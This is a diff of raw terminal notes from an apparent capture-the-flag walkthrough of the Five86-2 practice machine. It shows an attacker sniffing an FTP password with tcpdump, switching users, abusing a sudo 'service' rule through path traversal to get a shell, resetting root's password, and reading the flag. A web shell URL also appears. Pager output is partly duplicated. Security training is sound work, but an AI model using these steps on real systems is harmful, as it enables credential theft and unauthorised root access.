@@ -58,4 +58,274 @@ http://website.com/wp-admin/uploads/articulate_uploads/poc/index.php?cmd=whoami
 
 
 
+paul:esomepasswford
+
+
+
+stephen@five86-2:~$ timeout 120 tcpdump -w hacknos.pcap -i veth37bcc0b@if5
+timeout 120 tcpdump -w hacknos.pcap -i veth37bcc0b@if5
+tcpdump: veth37bcc0b@if5: No such device exists
+(SIOCGIFHWADDR: No such device)
+stephen@five86-2:~$ timeout 120 tcpdump -w hacknos.pcap -i veth37bcc0b
+timeout 120 tcpdump -w hacknos.pcap -i veth37bcc0b
+tcpdump: listening on veth37bcc0b, link-type EN10MB (Ethernet), capture size 262144 bytes
+46 packets captured
+46 packets received by filter
+0 packets dropped by kernel
+stephen@five86-2:~$ tcpdump -r hacknos.pcap | less
+tcpdump -r hacknos.pcap | less
+reading from file hacknos.pcap, link-type EN10MB (Ethernet)
+WARNING: terminal is not fully functional
+-  (press RETURN)
+
+q19:30:01.941881 IP five86-2.48158 > 172.18.0.10.ftp: Flags [S], seq 1479464326, 
+win 64240, options [mss 1460,sackOK,TS val 171836862 ecr 0,nop,wscale 7], length
+ 0
+19:30:01.941907 IP 172.18.0.10.ftp > five86-2.48158: Flags [S.], seq 4126709856,
+ ack 1479464327, win 65160, options [mss 1460,sackOK,TS val 172123450 ecr 171836
+862,nop,wscale 7], length 0
+19:30:01.941928 IP five86-2.48158 > 172.18.0.10.ftp: Flags [.], ack 1, win 502, 
+options [nop,nop,TS val 171836862 ecr 172123450], length 0
+19:30:01.943260 IP 172.18.0.10.42517 > _gateway.domain: 6616+ PTR? 1.0.18.172.in
+-addr.arpa. (41)
+19:30:02.039785 IP _gateway.domain > 172.18.0.10.42517: 6616 NXDomain* 0/1/0 (10
+0)
+19:30:02.042451 IP 172.18.0.10.ftp > five86-2.48158: Flags [P.], seq 1:58, ack 1
+, win 510, options [nop,nop,TS val 172123551 ecr 171836862], length 57: FTP: 220
+ ProFTPD 1.3.5e Server (Debian) [::ffff:172.18.0.10]
+19:30:02.042511 IP five86-2.48158 > 172.18.0.10.ftp: Flags [.], ack 58, win 502,
+ options [nop,nop,TS val 171836963 ecr 172123551], length 0
+19:30:02.043140 IP five86-2.48158 > 172.18.0.10.ftp: Flags [P.], seq 1:12, ack 5
+8, win 502, options [nop,nop,TS val 171836963 ecr 172123551], length 11: FTP: US
+ER paul
+19:30:02.043156 IP 172.18.0.10.ftp > five86-2.48158: Flags [.], ack 12, win 510,
+ options [nop,nop,TS val 172123551 ecr 171836963], length 0
+19:30:02.043565 IP 172.18.0.10.ftp > five86-2.48158: Flags [P.], seq 58:90, ack 
+: ESCESC[[19:30:01.941881 IP five86-2.48158 > 172.18.0.10.ftp: Flags [S], seq 1479464326, 
+win 64240, options [mss 1460,sackOK,TS val 171836862 ecr 0,nop,wscale 7], length
+ 0
+19:30:01.941907 IP 172.18.0.10.ftp > five86-2.48158: Flags [S.], seq 4126709856,
+ ack 1479464327, win 65160, options [mss 1460,sackOK,TS val 172123450 ecr 171836
+862,nop,wscale 7], length 0
+19:30:01.941928 IP five86-2.48158 > 172.18.0.10.ftp: Flags [.], ack 1, win 502, 
+options [nop,nop,TS val 171836862 ecr 172123450], length 0
+19:30:01.943260 IP 172.18.0.10.42517 > _gateway.domain: 6616+ PTR? 1.0.18.172.in
+-addr.arpa. (41)
+19:30:02.039785 IP _gateway.domain > 172.18.0.10.42517: 6616 NXDomain* 0/1/0 (10
+0)
+19:30:02.042451 IP 172.18.0.10.ftp > five86-2.48158: Flags [P.], seq 1:58, ack 1
+, win 510, options [nop,nop,TS val 172123551 ecr 171836862], length 57: FTP: 220
+ ProFTPD 1.3.5e Server (Debian) [::ffff:172.18.0.10]
+19:30:02.042511 IP five86-2.48158 > 172.18.0.10.ftp: Flags [.], ack 58, win 502,
+ options [nop,nop,TS val 171836963 ecr 172123551], length 0
+19:30:02.043140 IP five86-2.48158 > 172.18.0.10.ftp: Flags [P.], seq 1:12, ack 5
+8, win 502, options [nop,nop,TS val 171836963 ecr 172123551], length 11: FTP: US
+ER paul
+19:30:02.043156 IP 172.18.0.10.ftp > five86-2.48158: Flags [.], ack 12, win 510,
+ options [nop,nop,TS val 172123551 ecr 171836963], length 0
+19:30:02.043565 IP 172.18.0.10.ftp > five86-2.48158: Flags [P.], seq 58:90, ack 
+:: ESCESC[[19:30:01.941881 IP five86-2.48158 > 172.18.0.10.ftp: Flags [S], seq 1479464326, 
+win 64240, options [mss 1460,sackOK,TS val 171836862 ecr 0,nop,wscale 7], length
+ 0
+19:30:01.941907 IP 172.18.0.10.ftp > five86-2.48158: Flags [S.], seq 4126709856,
+ ack 1479464327, win 65160, options [mss 1460,sackOK,TS val 172123450 ecr 171836
+862,nop,wscale 7], length 0
+19:30:01.941928 IP five86-2.48158 > 172.18.0.10.ftp: Flags [.], ack 1, win 502, 
+options [nop,nop,TS val 171836862 ecr 172123450], length 0
+19:30:01.943260 IP 172.18.0.10.42517 > _gateway.domain: 6616+ PTR? 1.0.18.172.in
+-addr.arpa. (41)
+19:30:02.039785 IP _gateway.domain > 172.18.0.10.42517: 6616 NXDomain* 0/1/0 (10
+0)
+19:30:02.042451 IP 172.18.0.10.ftp > five86-2.48158: Flags [P.], seq 1:58, ack 1
+, win 510, options [nop,nop,TS val 172123551 ecr 171836862], length 57: FTP: 220
+ ProFTPD 1.3.5e Server (Debian) [::ffff:172.18.0.10]
+19:30:02.042511 IP five86-2.48158 > 172.18.0.10.ftp: Flags [.], ack 58, win 502,
+ options [nop,nop,TS val 171836963 ecr 172123551], length 0
+19:30:02.043140 IP five86-2.48158 > 172.18.0.10.ftp: Flags [P.], seq 1:12, ack 5
+8, win 502, options [nop,nop,TS val 171836963 ecr 172123551], length 11: FTP: US
+ER paul
+19:30:02.043156 IP 172.18.0.10.ftp > five86-2.48158: Flags [.], ack 12, win 510,
+ options [nop,nop,TS val 172123551 ecr 171836963], length 0
+19:30:02.043565 IP 172.18.0.10.ftp > five86-2.48158: Flags [P.], seq 58:90, ack 
+::12, win 510, options [nop,nop,TS val 172123552 ecr 171836963], length 32: FTP: 3
+:31 Password required for paul
+:19:30:02.043610 IP five86-2.48158 > 172.18.0.10.ftp: Flags [.], ack 90, win 502,
+: options [nop,nop,TS val 171836964 ecr 172123552], length 0
+:19:30:02.043641 IP five86-2.48158 > 172.18.0.10.ftp: Flags [P.], seq 12:33, ack 
+:90, win 502, options [nop,nop,TS val 171836964 ecr 172123552], length 21: FTP: P
+:ASS esomepasswford
+:19:30:02.043647 IP 172.18.0.10.ftp > five86-2.48158: Flags [.], ack 33, win 510,
+: options [nop,nop,TS val 172123552 ecr 171836964], length 0
+:19:30:02.055182 IP 172.18.0.10.ftp > five86-2.48158: Flags [P.], seq 90:115, ack
+: 33, win 510, options [nop,nop,TS val 172123563 ecr 171836964], length 25: FTP: 
+:230 User paul logged in
+:19:30:02.055208 IP five86-2.48158 > 172.18.0.10.ftp: Flags [.], ack 115, win 502
+:, options [nop,nop,TS val 171836975 ecr 172123563], length 0
+:19:30:02.055248 IP five86-2.48158 > 172.18.0.10.ftp: Flags [P.], seq 33:41, ack 
+:115, win 502, options [nop,nop,TS val 171836976 ecr 172123563], length 8: FTP: T
+:YPE I
+:19:30:02.055263 IP 172.18.0.10.ftp > five86-2.48158: Flags [.], ack 41, win 510,
+: options [nop,nop,TS val 172123564 ecr 171836976], length 0
+:19:30:02.055377 IP 172.18.0.10.ftp > five86-2.48158: Flags [P.], seq 115:134, ac
+:k 41, win 510, options [nop,nop,TS val 172123564 ecr 171836976], length 19: FTP:
+: 200 Type set to I
+:19:30:02.055385 IP five86-2.48158 > 172.18.0.10.ftp: Flags [.], ack 134, win 502
+:, options [nop,nop,TS val 171836976 ecr 172123564], length 0
+:stephen@five86-2:~$ 
+stephen@five86-2:~$ 
+stephen@five86-2:~$ 
+
+stephen@five86-2:~$ 
+
+stephen@five86-2:~$ 
+
+stephen@five86-2:~$ python3 -m SimpleHTTPServer 8888
+python3 -m SimpleHTTPServer 8888
+/usr/bin/python3: No module named SimpleHTTPServer
+stephen@five86-2:~$ su paul
+su paul
+Password: esomepasswford
+
+paul@five86-2:/home/stephen$ 
+
+paul@five86-2:/home/stephen$ 
+
+paul@five86-2:/home/stephen$ sudo -l
+sudo -l
+Matching Defaults entries for paul on five86-2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User paul may run the following commands on five86-2:
+    (peter) NOPASSWD: /usr/sbin/service
+paul@five86-2:/home/stephen$ cd ..
+cd ..
+paul@five86-2:/home$ ls
+ls
+barney	george	gillian  john  paul  peter  richard  stephen
+paul@five86-2:/home$ cd paul
+cd paul
+paul@five86-2:~$ ls -la
+ls -la
+total 28
+drwx------  3 paul paul 4096 Jan 13 11:19 .
+drwxr-xr-x 10 root root 4096 Jan  9 04:49 ..
+lrwxrwxrwx  1 paul paul    9 Jan 13 11:19 .bash_history -> /dev/null
+-rw-rw-r--  1 paul paul    0 Jan 13 11:02 file.txt
+-rwx------  1 paul paul  184 Jan 13 11:14 ftp_upload.sh
+drwxrwxr-x  3 paul paul 4096 Jan  9 05:27 .local
+-rw-rw-r--  1 paul paul   66 Jan  9 05:27 .selected_editor
+-rw-------  1 paul paul 4451 Jan 13 11:14 .viminfo
+paul@five86-2:~$ cat file.txt
+cat file.txt
+paul@five86-2:~$ cat ftp_upload.sh
+cat ftp_upload.sh
+#!/bin/sh
+HOST='172.18.0.10'
+USER='paul'
+PASSWD='esomepasswford'
+FILE='file.txt'
+
+ftp -n $HOST <<END_SCRIPT
+quote USER $USER
+quote PASS $PASSWD
+binary
+put $FILE
+quit
+END_SCRIPT
+exit 0
+paul@five86-2:~$ sudo su peter /usr/sbin/service/../../bin/bash
+sudo su peter /usr/sbin/service/../../bin/bash
+[sudo] password for paul: 
+
+
+
+Sorry, try again.
+[sudo] password for paul: 
+
+
+Sorry, try again.
+[sudo] password for paul: 
+sudo: 3 incorrect password attempts
+paul@five86-2:~$ 
+
+paul@five86-2:~$ sudo -u peter /usr/sbin/service ../../bin/bash
+sudo -u peter /usr/sbin/service ../../bin/bash
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+peter@five86-2:/$ ls
+ls
+bin    etc	       lib     lost+found  proc  snap	   tmp	    vmlinuz.old
+boot   home	       lib32   media	   root  srv	   usr
+cdrom  initrd.img      lib64   mnt	   run	 swap.img  var
+dev    initrd.img.old  libx32  opt	   sbin  sys	   vmlinuz
+peter@five86-2:/$ sudo -l
+sudo -l
+Matching Defaults entries for peter on five86-2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User peter may run the following commands on five86-2:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/passwd
+peter@five86-2:/$ sudo -u root /usr/bin/passwd
+sudo -u root /usr/bin/passwd
+New password: art
+
+Retype new password: art
+
+passwd: password updated successfully
+peter@five86-2:/$ 
+
+peter@five86-2:/$ su root
+su root
+Password: art
+
+root@five86-2:/# 
+
+root@five86-2:/# 
+
+root@five86-2:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@five86-2:/# 
+
+root@five86-2:/# pwd
+pwd
+/
+root@five86-2:/# ls     
+ls
+bin    etc             lib     lost+found  proc  snap      tmp      vmlinuz.old
+boot   home            lib32   media       root  srv       usr
+cdrom  initrd.img      lib64   mnt         run   swap.img  var
+dev    initrd.img.old  libx32  opt         sbin  sys       vmlinuz
+root@five86-2:/# cd root
+cd root
+root@five86-2:~# ls
+ls
+snap  thisistheflag.txt
+root@five86-2:~# cat thisistheflag.txt
+cat thisistheflag.txt
+
+__   __            _                           _                                 _ _ _ _ _ 
+\ \ / /           | |                         | |                               | | | | | |
+ \ V /___  _   _  | |__   __ ___   _____    __| | ___  _ __   ___  __      _____| | | | | |
+  \ // _ \| | | | | '_ \ / _` \ \ / / _ \  / _` |/ _ \| '_ \ / _ \ \ \ /\ / / _ \ | | | | |
+  | | (_) | |_| | | | | | (_| |\ V /  __/ | (_| | (_) | | | |  __/  \ V  V /  __/ | |_|_|_|
+  \_/\___/ \__,_| |_| |_|\__,_| \_/ \___|  \__,_|\___/|_| |_|\___|   \_/\_/ \___|_|_(_|_|_)
+                                                                                           
+                                                                                           
+Congratulations - hope you enjoyed Five86-2.
+
+If you have any feedback, please let me know at @Five86_x
+
+I also want to send out a big thanks to all those who help me with beta testing
+of the various challenges:  @m0tl3ycr3w and @syed__umar in particular
+
+
+
+root@five86-2:~# 
+
+
 
